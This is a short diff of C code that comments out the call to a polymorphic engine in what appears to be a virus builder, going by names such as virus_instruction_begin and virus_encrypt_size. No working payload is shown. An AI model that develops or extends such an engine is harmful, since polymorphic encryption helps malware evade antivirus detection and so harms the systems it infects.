@@ -84,12 +84,12 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 
 
 
-	// call the polymorphic engine
-	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset, full_addr_enc_begin) != 0)
-	{
-		printf("An error occured in the polymorphic engine\n");
+	// // call the polymorphic engine
+	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset, full_addr_enc_begin) != 0)
+	// {
+	// 	printf("An error occured in the polymorphic engine\n");
 
-	}
+	// }
 
 	// initialize the output filename
 	char out_filename[FILENAME_MAX];
